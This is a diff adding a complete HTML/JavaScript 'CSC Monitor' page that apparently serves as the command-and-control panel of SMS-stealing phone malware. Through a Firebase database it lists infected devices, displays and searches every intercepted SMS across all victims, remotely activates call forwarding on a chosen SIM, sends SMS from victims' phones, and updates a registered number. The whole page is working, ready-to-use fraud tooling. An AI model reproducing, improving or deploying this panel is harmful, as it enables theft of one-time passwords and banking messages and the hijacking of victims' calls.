@@ -1,1 +1,634 @@
-index
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>CSC Monitor Dashboard</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+:root{
+  --bg:#f0f2f5;--white:#fff;--purple:#5b21b6;--purple2:#7c3aed;--purple-light:#ede9fe;
+  --salmon:#f87171;--green:#16a34a;--red:#dc2626;--orange:#ea580c;
+  --text:#1e293b;--muted:#64748b;--border:#e2e8f0;
+  --shadow:0 2px 8px rgba(0,0,0,.08);--shadow2:0 8px 32px rgba(0,0,0,.18);
+}
+body{font-family:'Segoe UI',sans-serif;background:var(--bg);color:var(--text);min-height:100vh;}
+#setup-screen{min-height:100vh;display:flex;align-items:center;justify-content:center;padding:20px;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
+.setup-card{background:#fff;border-radius:20px;padding:32px 28px;width:100%;max-width:460px;box-shadow:var(--shadow2);}
+.setup-logo{text-align:center;margin-bottom:22px;}
+.setup-logo .ic{font-size:44px;}
+.setup-logo h1{font-size:21px;font-weight:700;color:var(--purple);margin-top:6px;}
+.setup-logo p{font-size:13px;color:var(--muted);margin-top:3px;}
+.fg{margin-bottom:14px;}
+.fg label{display:block;font-size:11px;font-weight:700;color:var(--muted);text-transform:uppercase;letter-spacing:.7px;margin-bottom:5px;}
+.fg input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;font-size:14px;outline:none;transition:border-color .2s;}
+.fg input:focus{border-color:var(--purple2);}
+.pbtn{width:100%;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:15px;font-weight:700;cursor:pointer;margin-top:4px;}
+.pbtn:disabled{opacity:.5;cursor:not-allowed;}
+.errbox{background:#fef2f2;border:1px solid #fecaca;color:#b91c1c;padding:10px 13px;border-radius:8px;font-size:13px;margin-top:10px;display:none;}
+#login-screen{min-height:100vh;display:none;align-items:center;justify-content:center;background:linear-gradient(135deg,#4c1d95,#1e1b4b);}
+.login-card{background:#fff;border-radius:20px;padding:36px 28px;width:100%;max-width:340px;box-shadow:var(--shadow2);text-align:center;}
+.login-card .ic{font-size:44px;}
+.login-card h2{font-size:19px;font-weight:700;color:var(--purple);margin:8px 0 4px;}
+.login-card p{font-size:13px;color:var(--muted);margin-bottom:20px;}
+.login-card input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:12px;font-size:20px;text-align:center;letter-spacing:5px;outline:none;margin-bottom:14px;}
+.login-card input:focus{border-color:var(--purple2);}
+#app{display:none;flex-direction:column;min-height:100vh;}
+.topbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:200;box-shadow:0 2px 10px rgba(91,33,182,.35);}
+.topbar-title{color:#fff;font-size:16px;font-weight:700;display:flex;align-items:center;gap:8px;}
+.live-dot{width:8px;height:8px;border-radius:50%;background:#4ade80;box-shadow:0 0 8px #4ade80;animation:pulse 2s infinite;}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:.4;}}
+.xbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:6px 12px;font-size:12px;cursor:pointer;}
+.search-sec{background:#fff;padding:11px 16px;border-bottom:1px solid var(--border);position:sticky;top:57px;z-index:190;}
+.sw{position:relative;}
+.sw input{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:10px 38px 10px 38px;font-size:14px;outline:none;transition:border-color .2s;}
+.sw input:focus{border-color:var(--purple2);}
+.si{position:absolute;left:12px;top:50%;transform:translateY(-50%);font-size:16px;}
+.sc{position:absolute;right:11px;top:50%;transform:translateY(-50%);background:none;border:none;font-size:15px;color:var(--muted);cursor:pointer;display:none;}
+.stats-bar{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;padding:12px 16px;}
+.sbox{background:#fff;border-radius:12px;padding:12px;text-align:center;box-shadow:var(--shadow);}
+.snum{font-size:22px;font-weight:700;}
+.slbl{font-size:11px;color:var(--muted);margin-top:2px;}
+.reg-bar{background:#fff;padding:8px 16px;border-bottom:1px solid var(--border);font-size:13px;color:var(--muted);text-align:center;}
+.upd-btn{display:block;margin:12px 16px;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:14px;font-size:14px;font-weight:700;text-align:center;cursor:pointer;letter-spacing:1px;width:calc(100% - 32px);}
+.refresh-btn{display:block;margin:0 16px 12px;background:#fff;color:var(--purple);border:1.5px solid var(--purple-light);border-radius:10px;padding:10px;font-size:13px;font-weight:600;text-align:center;cursor:pointer;width:calc(100% - 32px);}
+.dev-list{padding:0 16px 80px;}
+.dev-card{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);cursor:pointer;transition:transform .15s;}
+.dev-card:active{transform:scale(.98);}
+.dct{display:flex;align-items:center;gap:11px;}
+.dnum{font-size:16px;font-weight:700;color:var(--muted);min-width:22px;}
+.dic{font-size:28px;}
+.dinf{flex:1;}
+.dname{font-size:15px;font-weight:600;}
+.did{font-size:11px;color:var(--muted);font-family:monospace;margin-top:2px;}
+.dbat{font-size:12px;color:var(--muted);margin-top:2px;}
+.dstat{text-align:center;padding:6px 0 0;font-size:12px;font-weight:600;border-top:1px solid var(--border);margin-top:10px;}
+.son{color:var(--green);}
+.soff{color:var(--red);}
+.sbadge{background:var(--purple-light);color:var(--purple);font-size:11px;font-weight:700;padding:2px 8px;border-radius:20px;margin-left:auto;white-space:nowrap;}
+#detail-screen{display:none;flex-direction:column;min-height:100vh;}
+.dtopbar{background:linear-gradient(135deg,var(--purple),var(--purple2));padding:13px 16px;display:flex;align-items:center;gap:11px;position:sticky;top:0;z-index:200;}
+.bbtn{background:rgba(255,255,255,.2);color:#fff;border:none;border-radius:8px;padding:7px 12px;font-size:13px;cursor:pointer;}
+.dtitle{color:#fff;font-size:15px;font-weight:700;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;}
+.dactions{display:grid;grid-template-columns:1fr 1fr;gap:10px;padding:13px 16px;}
+.actbtn{background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:13px;font-weight:700;cursor:pointer;}
+.sms-list-wrap{padding:0 16px 80px;}
+.scard{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);}
+.sadr{font-size:14px;font-weight:600;margin-bottom:5px;}
+.sbody{font-size:13px;color:var(--muted);line-height:1.6;}
+.stime{font-size:11px;color:var(--muted);text-align:right;margin-top:7px;}
+#search-screen{display:none;flex-direction:column;min-height:100vh;}
+.src-card{background:#fff;border-radius:14px;padding:13px 15px;margin-bottom:10px;box-shadow:var(--shadow);cursor:pointer;}
+.sdlbl{font-size:12px;font-weight:700;color:var(--purple);background:var(--purple-light);padding:3px 10px;border-radius:20px;display:inline-block;margin-bottom:8px;}
+.smcnt{font-size:11px;color:var(--muted);margin-left:6px;}
+.highlight{background:#fef08a;color:#713f12;border-radius:3px;padding:0 2px;}
+.overlay{position:fixed;inset:0;background:rgba(0,0,0,.5);z-index:500;display:none;align-items:center;justify-content:center;padding:16px;}
+.dialog{background:#fff;border-radius:20px;width:100%;max-width:440px;overflow:hidden;animation:popIn .22s ease;max-height:90vh;overflow-y:auto;}
+@keyframes popIn{from{transform:scale(.92);opacity:0;}to{transform:scale(1);opacity:1;}}
+.dhdr{padding:17px 20px;text-align:center;font-size:17px;font-weight:700;color:#fff;background:linear-gradient(135deg,var(--salmon),#fb923c);}
+.dbody{padding:18px 20px;}
+.dinput{width:100%;border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;font-size:15px;outline:none;margin-bottom:11px;font-family:inherit;}
+.dinput:focus{border-color:var(--purple2);}
+.dbtn{width:100%;background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;margin-bottom:9px;}
+.dbtn-row{display:grid;grid-template-columns:1fr 1fr;gap:9px;margin-bottom:9px;}
+.dbtn-h{background:linear-gradient(135deg,var(--purple),var(--purple2));color:#fff;border:none;border-radius:10px;padding:13px;font-size:14px;font-weight:700;cursor:pointer;}
+.dbtn-h.red{background:linear-gradient(135deg,#dc2626,#ef4444);}
+.dbtn-cancel{width:100%;background:var(--bg);color:var(--muted);border:1px solid var(--border);border-radius:10px;padding:11px;font-size:14px;cursor:pointer;}
+.sim-opt{display:flex;align-items:center;gap:11px;border:1.5px solid var(--border);border-radius:10px;padding:11px 13px;margin-bottom:9px;cursor:pointer;}
+.sim-opt.sel{border-color:var(--purple2);background:var(--purple-light);}
+.sim-ic{font-size:22px;}
+.sim-inf{flex:1;}
+.sim-nm{font-size:14px;font-weight:600;}
+.sim-no{font-size:12px;color:var(--muted);}
+.sim-rb{width:17px;height:17px;border-radius:50%;border:2px solid var(--border);display:flex;align-items:center;justify-content:center;flex-shrink:0;}
+.sim-rb.chk{border-color:var(--purple2);}
+.sim-rb.chk::after{content:'';width:8px;height:8px;border-radius:50%;background:var(--purple2);}
+.cf-res{background:#f0fdf4;border:1px solid #bbf7d0;color:#15803d;border-radius:8px;padding:9px 13px;font-size:13px;margin-bottom:10px;display:none;text-align:center;}
+.fwd-lbl{font-size:13px;color:var(--muted);margin-bottom:7px;text-align:center;}
+.loading{display:flex;align-items:center;justify-content:center;padding:48px;gap:11px;color:var(--muted);font-size:14px;}
+.spinner{width:21px;height:21px;border:2.5px solid var(--border);border-top-color:var(--purple2);border-radius:50%;animation:spin .8s linear infinite;}
+@keyframes spin{to{transform:rotate(360deg);}}
+.empty{text-align:center;padding:48px 16px;color:var(--muted);}
+.empty .ei{font-size:38px;margin-bottom:10px;opacity:.5;}
+.empty p{font-size:14px;}
+#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:#1e293b;color:#fff;padding:10px 20px;border-radius:20px;font-size:13px;z-index:9999;opacity:0;transition:opacity .3s;pointer-events:none;white-space:nowrap;}
+::-webkit-scrollbar{width:5px;}
+::-webkit-scrollbar-thumb{background:#cbd5e1;border-radius:3px;}
+</style>
+</head>
+<body>
+  <div id="setup-screen">
+  <div class="setup-card">
+    <div class="setup-logo">
+      <div class="ic">📡</div>
+      <h1>CSC Monitor</h1>
+      <p>Firebase Realtime Database Dashboard</p>
+    </div>
+    <div class="fg"><label>Firebase Database URL</label>
+      <input id="cfg-url" placeholder="https://xxx-default-rtdb.firebaseio.com" /></div>
+    <div class="fg"><label>API Key</label>
+      <input id="cfg-key" type="password" placeholder="AIzaSy..." /></div>
+    <div class="fg"><label>Project ID</label>
+      <input id="cfg-pid" placeholder="your-project-id" /></div>
+    <div class="fg"><label>Main Node (default: csc6)</label>
+      <input id="cfg-node" value="csc6" /></div>
+    <button class="pbtn" id="setup-btn" onclick="doSetup()">🔗 Connect &amp; Login</button>
+    <div class="errbox" id="setup-err"></div>
+  </div>
+</div>
+<div id="login-screen">
+  <div class="login-card">
+    <div class="ic">🔐</div>
+    <h2>Admin Login</h2>
+    <p>Firebase Admin Password daalo</p>
+    <input type="password" id="login-pass" placeholder="••••••" maxlength="20" onkeydown="if(event.key==='Enter')doLogin()" />
+    <button class="pbtn" onclick="doLogin()">Login</button>
+    <div class="errbox" id="login-err"></div>
+  </div>
+</div>
+<div id="app">
+  <div class="topbar">
+    <div class="topbar-title"><span class="live-dot"></span> CSC Monitor</div>
+    <div style="display:flex;gap:8px;">
+      <button class="xbtn" onclick="refreshData()">🔄</button>
+      <button class="xbtn" onclick="doDisconnect()">Logout</button>
+    </div>
+  </div>
+  <div class="search-sec">
+    <div class="sw">
+      <span class="si">🔍</span>
+      <input id="global-search" placeholder="Search SMS across all devices..." oninput="onSearch(this.value)" />
+      <button class="sc" id="search-clear-btn" onclick="clearSearch()">✕</button>
+    </div>
+  </div>
+  <div id="main-content">
+    <div class="reg-bar" id="register-bar">Register : —</div>
+    <button class="upd-btn" onclick="openUpdateNo()">UPDATE NO</button>
+    <div class="stats-bar">
+      <div class="sbox"><div class="snum" id="s-total" style="color:var(--purple)">0</div><div class="slbl">Devices</div></div>
+      <div class="sbox"><div class="snum" id="s-online" style="color:var(--green)">0</div><div class="slbl">Online</div></div>
+      <div class="sbox"><div class="snum" id="s-sms" style="color:var(--orange)">0</div><div class="slbl">Total SMS</div></div>
+    </div>
+    <div class="dev-list" id="device-list">
+      <div class="loading"><div class="spinner"></div> Loading...</div>
+    </div>
+  </div>
+</div>
+<div id="detail-screen">
+  <div class="dtopbar">
+    <button class="bbtn" onclick="goBack()">← Back</button>
+    <div class="dtitle" id="detail-title">Device</div>
+  </div>
+  <div class="dactions">
+    <button class="actbtn" onclick="openCallFwd()">📞 CALL FORWARDING</button>
+    <button class="actbtn" onclick="openSmsSend()">✉️ SMS SEND</button>
+  </div>
+  <div class="sms-list-wrap" id="sms-list"></div>
+</div>
+<div id="search-screen">
+  <div class="topbar" style="position:sticky;top:0;z-index:200;">
+    <div class="topbar-title">🔍 Search Results</div>
+    <button class="xbtn" onclick="clearSearch()">← Back</button>
+  </div>
+  <div style="padding:11px 16px 4px;"><div style="font-size:13px;color:var(--muted);" id="search-summary"></div></div>
+  <div style="padding:8px 16px 80px;" id="search-results-list"></div>
+</div>
+<div class="overlay" id="dlg-cf">
+  <div class="dialog">
+    <div class="dhdr">📞 Call Forwarding</div>
+    <div class="dbody">
+      <div id="sim-list"></div>
+      <div class="fwd-lbl">Forward To</div>
+      <input class="dinput" id="cf-number" placeholder="Your Number" type="tel" />
+      <div class="dbtn-row">
+        <button class="dbtn-h" onclick="doCF('active')">ACTIVE</button>
+        <button class="dbtn-h red" onclick="doCF('deactive')">DEACTIVE</button>
+      </div>
+      <button class="dbtn" onclick="doCF('check')">CALL FORWARDING CHECK</button>
+      <div class="cf-res" id="cf-result"></div>
+      <button class="dbtn-cancel" onclick="closeDialog('dlg-cf')">Cancel</button>
+    </div>
+  </div>
+</div>
+<div class="overlay" id="dlg-sms">
+  <div class="dialog">
+    <div class="dhdr">✉️ Send SMS Customer</div>
+    <div class="dbody">
+      <input class="dinput" id="sms-to" placeholder="Your Number" type="tel" />
+      <textarea class="dinput" id="sms-msg" placeholder="Message Box" rows="4" style="resize:none;"></textarea>
+      <button class="dbtn" onclick="doSendSms()">SMS SEND</button>
+      <button class="dbtn-cancel" onclick="closeDialog('dlg-sms')">Cancel</button>
+    </div>
+  </div>
+</div>
+<div class="overlay" id="dlg-update">
+  <div class="dialog">
+    <div class="dhdr">🔄 Update Number</div>
+    <div class="dbody">
+      <input class="dinput" id="update-num" placeholder="Your number" type="tel" />
+      <button class="dbtn" onclick="doUpdateNo()">UPDATE</button>
+      <button class="dbtn-cancel" onclick="closeDialog('dlg-update')">Cancel</button>
+    </div>
+  </div>
+</div>
+<div id="toast"></div>
+<script>
+var DB_URL='', API_KEY='', ROOT_NODE='csc6';
+var DEVICES={}, _adminPass='', currentDeviceKey=null, selectedSim=0, toastTimer=null;
+var pollTimer=null, isSearchMode=false;
+function fbGet(path){
+  return fetch(DB_URL+'/'+path+'.json?auth='+API_KEY)
+    .then(function(r){return r.json();});
+}
+function fbSet(path, data){
+  return fetch(DB_URL+'/'+path+'.json?auth='+API_KEY, {
+    method:'PUT',
+    headers:{'Content-Type':'application/json'},
+    body:JSON.stringify(data)
+  }).then(function(r){return r.json();});
+}
+function showToast(msg){
+  var t=document.getElementById('toast');
+  t.textContent=msg; t.style.opacity='1';
+  if(toastTimer) clearTimeout(toastTimer);
+  toastTimer=setTimeout(function(){t.style.opacity='0';},2200);
+}
+function doSetup(){
+  DB_URL = document.getElementById('cfg-url').value.trim().replace(/\/$/,'');
+  API_KEY= document.getElementById('cfg-key').value.trim();
+  var pid = document.getElementById('cfg-pid').value.trim();
+  ROOT_NODE=document.getElementById('cfg-node').value.trim()||'csc6';
+  if(!DB_URL||!API_KEY||!pid){showSetupErr('Sab fields zaroori hain!');return;}
+  var btn=document.getElementById('setup-btn');
+  btn.disabled=true; btn.textContent='Connecting...';
+  fbGet(ROOT_NODE+'/Admin_Password').then(function(val){
+    if(val===null||val===undefined){
+      showSetupErr("'"+ROOT_NODE+"' mein Admin_Password nahi mila. Node name check karo.");
+      btn.disabled=false; btn.textContent='🔗 Connect & Login'; return;
+    }
+    _adminPass=String(val);
+    document.getElementById('setup-screen').style.display='none';
+    var ls=document.getElementById('login-screen');
+    ls.style.display='flex'; ls.style.flexDirection='column';
+    document.getElementById('login-err').style.display='none';
+    document.getElementById('login-pass').value='';
+    setTimeout(function(){document.getElementById('login-pass').focus();},200);
+  }).catch(function(e){
+    showSetupErr('Connection failed: '+e.message+' — URL/API Key check karo.');
+    btn.disabled=false; btn.textContent='🔗 Connect & Login';
+  });
+}
+function showSetupErr(m){var e=document.getElementById('setup-err');e.textContent=m;e.style.display='block';}
+function doLogin(){
+  var pass=document.getElementById('login-pass').value;
+  if(pass===_adminPass){
+    document.getElementById('login-screen').style.display='none';
+    var app=document.getElementById('app');
+    app.style.display='flex'; app.style.flexDirection='column';
+    loadData();
+    startPolling();
+  } else {
+    var e=document.getElementById('login-err');
+    e.textContent='❌ Wrong password!'; e.style.display='block';
+  }
+}
+function doDisconnect(){
+  stopPolling();
+  document.getElementById('app').style.display='none';
+  document.getElementById('detail-screen').style.display='none';
+  document.getElementById('search-screen').style.display='none';
+  document.getElementById('setup-screen').style.display='flex';
+  document.getElementById('setup-btn').disabled=false;
+  document.getElementById('setup-btn').textContent='🔗 Connect & Login';
+  showToast('Logged out');
+}
+function startPolling(){
+  stopPolling();
+  pollTimer=setInterval(function(){if(!isSearchMode) loadData();},8000);
+}
+function stopPolling(){
+  if(pollTimer){clearInterval(pollTimer);pollTimer=null;}
+}
+function objToArr(obj){
+  if(!obj) return [];
+  if(Array.isArray(obj)) return obj;
+  var arr=[]; Object.keys(obj).forEach(function(k){arr.push(obj[k]);}); return arr;
+}
+function loadData(){
+  fbGet(ROOT_NODE+'/All_User').then(function(data){
+    if(!data){document.getElementById('device-list').innerHTML='<div class="empty"><div class="ei">📱</div><p>Koi data nahi mila.</p></div>';return;}
+    DEVICES={};
+    var totalSms=0, online=0;
+    var keys=Object.keys(data);
+    keys.forEach(function(k){
+      var v=data[k];
+      if(typeof v!=='object'||!v) return;
+      var info=v.Info||{};
+      var smsRaw=v.Sms||{};
+      var sim=v.SimINFO||v.SimInfo||v.simInfo||{};
+      var smsArr=objToArr(smsRaw);
+      totalSms+=smsArr.length;
+      var st=String(info.Status||v.Status||info.status||'').toLowerCase();
+      var isOnline=(st==='online'||st==='1'||st=='true');
+      if(isOnline) online++;
+      DEVICES[k]={key:k,
+        name:info.MobileName||info.mobileName||info.DeviceName||info.name||k,
+        id:info.DeviceId||info.deviceId||info.device_id||k,
+        battery:info.Battery||info.battery||'—',
+        status:isOnline?'online':'offline',
+        sms:smsArr,simInfo:sim,callFor:v.Call_For||{},raw:v};
+    });
+    document.getElementById('s-total').textContent=Object.keys(DEVICES).length;
+    document.getElementById('s-online').textContent=online;
+    document.getElementById('s-sms').textContent=totalSms;
+    var anyDev=Object.values(DEVICES)[0];
+    if(anyDev&&anyDev.raw){
+      var reg=anyDev.raw.RegisterNo||anyDev.raw.registerNo||anyDev.raw.Register_No||anyDev.raw.register||'—';
+      document.getElementById('register-bar').textContent='Register : '+reg;
+    }
+    renderDeviceList();
+  }).catch(function(e){
+    console.error('Load error:',e);
+  });
+}
+function renderDeviceList(){
+  var container=document.getElementById('device-list');
+  var devs=Object.values(DEVICES);
+  if(devs.length===0){
+    container.innerHTML='<div class="empty"><div class="ei">📱</div><p>No devices found.</p></div>';
+    return;
+  }
+  devs.sort(function(a,b){
+    if(a.status==='online'&&b.status!=='online') return -1;
+    if(a.status!=='online'&&b.status==='online') return 1;
+    return a.name.localeCompare(b.name);
+  });
+  var html='';
+  devs.forEach(function(dev,idx){
+    var stClass=dev.status==='online'?'son':'soff';
+    var stText=dev.status==='online'?'🟢 Online':'🔴 Offline';
+    var icon=dev.status==='online'?'📱':'📴';
+    html+='<div class="dev-card" onclick="openDevice(\''+dev.key+'\')">'+
+      '<div class="dct">'+
+        '<div class="dnum">'+(idx+1)+'</div>'+
+        '<div class="dic">'+icon+'</div>'+
+        '<div class="dinf">'+
+          '<div class="dname">'+escHtml(dev.name)+'</div>'+
+          '<div class="did">'+escHtml(dev.id)+'</div>'+
+          '<div class="dbat">🔋 '+escHtml(String(dev.battery))+'</div>'+
+        '</div>'+
+        '<span class="sbadge">'+dev.sms.length+' SMS</span>'+
+      '</div>'+
+      '<div class="dstat '+stClass+'">'+stText+'</div>'+
+    '</div>';
+  });
+  container.innerHTML=html;
+}
+function escHtml(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}
+function openDevice(key){
+  currentDeviceKey=key;
+  var dev=DEVICES[key];
+  if(!dev) return;
+  document.getElementById('app').style.display='none';
+  document.getElementById('search-screen').style.display='none';
+  var ds=document.getElementById('detail-screen');
+  ds.style.display='flex'; ds.style.flexDirection='column';
+  document.getElementById('detail-title').textContent=dev.name+' ('+dev.id+')';
+  renderSmsList(dev);
+}
+function renderSmsList(dev){
+  var container=document.getElementById('sms-list');
+  var smsArr=dev.sms||[];
+  if(smsArr.length===0){
+    container.innerHTML='<div class="empty"><div class="ei">📭</div><p>No SMS messages</p></div>';
+    return;
+  }
+  var sorted=smsArr.slice().sort(function(a,b){
+    var ta=a.Time||a.time||a.date||''; var tb=b.Time||b.time||b.date||'';
+    return String(tb).localeCompare(String(ta));
+  });
+  var html='';
+  sorted.forEach(function(sms){
+    var addr=sms.Address||sms.address||sms.from||sms.From||sms.sender||'Unknown';
+    var body=sms.Body||sms.body||sms.msg||sms.Msg||sms.message||'—';
+    var time=sms.Time||sms.time||sms.date||sms.Date||'—';
+    html+='<div class="scard">'+
+      '<div class="sadr">📩 '+escHtml(String(addr))+'</div>'+
+      '<div class="sbody">'+escHtml(String(body))+'</div>'+
+      '<div class="stime">🕐 '+escHtml(String(time))+'</div>'+
+    '</div>';
+  });
+  container.innerHTML=html;
+}
+function goBack(){
+  document.getElementById('detail-screen').style.display='none';
+  document.getElementById('search-screen').style.display='none';
+  document.getElementById('app').style.display='flex';
+  currentDeviceKey=null;
+  isSearchMode=false;
+  document.getElementById('global-search').value='';
+  document.getElementById('search-clear-btn').style.display='none';
+  loadData();
+}
+function onSearch(val){
+  var clearBtn=document.getElementById('search-clear-btn');
+  if(val.trim().length===0){
+    clearBtn.style.display='none';
+    if(isSearchMode){goBack();}
+    return;
+  }
+  clearBtn.style.display='block';
+  isSearchMode=true;
+  var q=val.toLowerCase().trim();
+  var results=[];
+  Object.values(DEVICES).forEach(function(dev){
+    (dev.sms||[]).forEach(function(sms){
+      var addr=String(sms.Address||sms.address||sms.from||sms.From||sms.sender||'');
+      var body=String(sms.Body||sms.body||sms.msg||sms.Msg||sms.message||'');
+      var time=String(sms.Time||sms.time||sms.date||sms.Date||'');
+      if(addr.toLowerCase().indexOf(q)!==-1 || body.toLowerCase().indexOf(q)!==-1 || time.toLowerCase().indexOf(q)!==-1){
+        results.push({device:dev, sms:sms, address:addr, body:body, time:time});
+      }
+    });
+  });
+  document.getElementById('search-summary').textContent=results.length+' result(s) for "'+val+'"';
+  var container=document.getElementById('search-results-list');
+  if(results.length===0){
+    container.innerHTML='<div class="empty"><div class="ei">🔍</div><p>No results found</p></div>';
+    return;
+  }
+  var html='';
+  results.forEach(function(r){
+    var highlightBody=highlightMatch(r.body,q);
+    var highlightAddr=highlightMatch(r.address,q);
+    html+='<div class="src-card" onclick="openDevice(\''+r.device.key+'\')">'+
+      '<span class="sdlbl">📱 '+escHtml(r.device.name)+'</span>'+
+      '<span class="smcnt">'+escHtml(r.device.id)+'</span>'+
+      '<div class="sadr">📩 '+highlightAddr+'</div>'+
+      '<div class="sbody">'+highlightBody+'</div>'+
+      '<div class="stime">🕐 '+escHtml(r.time)+'</div>'+
+    '</div>';
+  });
+  container.innerHTML=html;
+  document.getElementById('app').style.display='none';
+  document.getElementById('detail-screen').style.display='none';
+  var ss=document.getElementById('search-screen');
+  ss.style.display='flex'; ss.style.flexDirection='column';
+  stopPolling();
+}
+function highlightMatch(text, q){
+  var s=escHtml(String(text));
+  if(!q) return s;
+  var regex=new RegExp('('+q.replace(/[.*+?^${}()|[\]\\]/g,'\\$&')+')','gi');
+  return s.replace(regex,'<span class="highlight">$1</span>');
+}
+function clearSearch(){
+  document.getElementById('global-search').value='';
+  document.getElementById('search-clear-btn').style.display='none';
+  isSearchMode=false;
+  goBack();
+  startPolling();
+}
+function refreshData(){
+  if(isSearchMode) return;
+  loadData();
+  showToast('Refreshed ✅');
+}
+function openCallFwd(){
+  if(!currentDeviceKey) return;
+  var dev=DEVICES[currentDeviceKey];
+  if(!dev) return;
+  selectedSim=0;
+  var sims=dev.simInfo;
+  var simList=document.getElementById('sim-list');
+  var simKeys=sims?Object.keys(sims):[];
+  if(simKeys.length===0){
+    simList.innerHTML='<div style="font-size:13px;color:var(--muted);text-align:center;padding:10px;">No SIM info found</div>';
+  } else {
+    var html='';
+    simKeys.forEach(function(k,idx){
+      var s=sims[k];
+      var number=s.Number||s.number||s.phone||s.Phone||k;
+      var operator=s.Operator||s.operator||s.carrier||s.Carrier||'Unknown';
+      var selClass=(idx===selectedSim)?' sel':'';
+      var chkClass=(idx===selectedSim)?' chk':'';
+      html+='<div class="sim-opt'+selClass+'" onclick="selectSim('+idx+')">'+
+        '<div class="sim-ic">📶</div>'+
+        '<div class="sim-inf"><div class="sim-nm">SIM '+(idx+1)+'</div><div class="sim-no">'+escHtml(String(number))+' | '+escHtml(String(operator))+'</div></div>'+
+        '<div class="sim-rb'+chkClass+'"></div>'+
+      '</div>';
+    });
+    simList.innerHTML=html;
+  }
+  document.getElementById('cf-number').value='';
+  document.getElementById('cf-result').style.display='none';
+  openDialog('dlg-cf');
+}
+function selectSim(idx){selectedSim=idx;openCallFwd();}
+function doCF(action){
+  if(!currentDeviceKey){showToast('No device selected');return;}
+  var dev=DEVICES[currentDeviceKey];
+  var sims=dev.simInfo;
+  var simKeys=sims?Object.keys(sims):[];
+  var number=document.getElementById('cf-number').value.trim();
+  var resBox=document.getElementById('cf-result');
+  if(action==='check'){
+    var path=ROOT_NODE+'/All_User/'+currentDeviceKey+'/Call_For';
+    fbGet(path).then(function(data){
+      resBox.style.display='block';
+      if(data){
+        resBox.innerHTML='✅ CF Status: <b>'+escHtml(JSON.stringify(data))+'</b>';
+        resBox.style.background='#f0fdf4'; resBox.style.border='1px solid #bbf7d0'; resBox.style.color='#15803d';
+      } else {
+        resBox.innerHTML='ℹ️ No call forwarding data';
+        resBox.style.background='#eff6ff'; resBox.style.border='1px solid #bfdbfe'; resBox.style.color='#1d4ed8';
+      }
+      showToast('CF Status checked');
+    }).catch(function(e){
+      resBox.style.display='block';
+      resBox.innerHTML='❌ Error: '+e.message;
+      resBox.style.background='#fef2f2'; resBox.style.border='1px solid #fecaca'; resBox.style.color='#b91c1c';
+    });
+    return;
+  }
+  if(!number && action!=='deactive'){showToast('Please enter a number!'); return;}
+  var simNum='';
+  if(simKeys.length>0){
+    var selSim=sims[simKeys[selectedSim]];
+    simNum=selSim.Number||selSim.number||selSim.phone||selSim.Phone||simKeys[selectedSim];
+  }
+  var cfData={
+    action:action,
+    number:number||'',
+    sim:simNum,
+    simIndex:selectedSim,
+    timestamp:new Date().toISOString()
+  };
+  var path=ROOT_NODE+'/All_User/'+currentDeviceKey+'/Call_For';
+  fbSet(path, cfData).then(function(){
+    resBox.style.display='block';
+    resBox.innerHTML='✅ Call Forwarding <b>'+action.toUpperCase()+'</b> set for '+escHtml(number||simNum);
+    resBox.style.background='#f0fdf4'; resBox.style.border='1px solid #bbf7d0'; resBox.style.color='#15803d';
+    showToast('CF '+action+' ✅');
+  }).catch(function(e){
+    resBox.style.display='block';
+    resBox.innerHTML='❌ Error: '+e.message;
+    resBox.style.background='#fef2f2'; resBox.style.border='1px solid #fecaca'; resBox.style.color='#b91c1c';
+    showToast('CF failed ❌');
+  });
+}
+function openSmsSend(){
+  document.getElementById('sms-to').value='';
+  document.getElementById('sms-msg').value='';
+  openDialog('dlg-sms');
+}
+function doSendSms(){
+  if(!currentDeviceKey){showToast('No device selected');return;}
+  var to=document.getElementById('sms-to').value.trim();
+  var msg=document.getElementById('sms-msg').value.trim();
+  if(!to||!msg){showToast('Number and message required!');return;}
+  var smsData={
+    To:to,
+    Msg:msg,
+    Time:new Date().toISOString(),
+    Status:'pending',
+    Direction:'outgoing'
+  };
+  var path=ROOT_NODE+'/All_User/'+currentDeviceKey+'/Sms_Send';
+  fbSet(path, smsData).then(function(){
+    showToast('SMS sent ✅');
+    closeDialog('dlg-sms');
+  }).catch(function(e){
+    showToast('SMS failed ❌ '+e.message);
+  });
+}
+function openUpdateNo(){
+  document.getElementById('update-num').value='';
+  openDialog('dlg-update');
+}
+function doUpdateNo(){
+  var num=document.getElementById('update-num').value.trim();
+  if(!num){showToast('Number required!');return;}
+  var path=ROOT_NODE+'/All_User/RegisterNo';
+  fbSet(path, num).then(function(){
+    showToast('Register number updated ✅');
+    closeDialog('dlg-update');
+    loadData();
+  }).catch(function(e){
+    showToast('Update failed ❌ '+e.message);
+  });
+}
+function openDialog(id){
+  document.getElementById(id).style.display='flex';
+}
+function closeDialog(id){
+  document.getElementById(id).style.display='none';
+}
+document.querySelectorAll('.overlay').forEach(function(ov){
+  ov.addEventListener('click',function(e){
+    if(e.target===ov) ov.style.display='none';
+  });
+});
+</script>
+</body>
+</html>
